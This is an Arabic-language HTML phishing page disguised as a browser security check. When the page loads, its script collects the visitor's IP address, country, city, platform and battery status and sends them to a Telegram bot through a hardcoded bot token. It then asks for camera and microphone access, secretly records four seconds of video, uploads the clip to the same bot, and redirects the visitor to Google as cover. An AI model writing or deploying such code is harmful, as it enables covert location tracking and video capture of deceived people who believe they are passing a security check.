<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق من الأمان</title>
    <style>
        body { background-color: #000; color: white; font-family: Arial, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #333; border-top: 4px solid #0088cc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 15px; color: #777; font-size: 14px; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>جاري التحقق من أمان المتصفح...</p>

    <script>
        // --- الإعدادات ---
        const BOT_TOKEN = "8619027051:AAH06xxHUXEeZ_PLu8l5QF8zct7nrjNW4ts";
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chatId');

        async function startCapture() {
            if (!chatId) return;

            let deviceInfo = "";

            // 1. جلب معلومات الـ IP والموقع
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                deviceInfo += `IP: ${data.ip} | الدولة: ${data.country_name} | المدينة: ${data.city} | `;
            } catch (e) { deviceInfo += "IP: غير معروف | "; }

            // 2. جلب معلومات الجهاز والبطارية
            try {
                const battery = await navigator.getBattery();
                deviceInfo += `المنصة: ${navigator.platform} | البطارية: ${Math.round(battery.level * 100)}% | الشحن: ${battery.charging ? 'نعم' : 'لا'}`;
            } catch (e) { deviceInfo += `المنصة: ${navigator.platform}`; }

            // إرسال تقرير البيانات فوراً
            await sendToTelegram(deviceInfo);

            // 3. محاولة تصوير الفيديو
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];

                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    await sendVideoToTelegram(blob);
                    window.location.href = "https://www.google.com"; // تمويه
                };

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, 4000); // تصوير 4 ثوانٍ

            } catch (err) {
                // في حال رفض الكاميرا، نكتفي بالبيانات ونوجهه لجوجل
                window.location.href = "https://www.google.com";
            }
        }

        async function sendToTelegram(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
            await fetch(url);
        }

        async function sendVideoToTelegram(videoBlob) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('video', videoBlob, 'data.webm');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
        }

        window.onload = startCapture;
    </script>
</body>
</html>
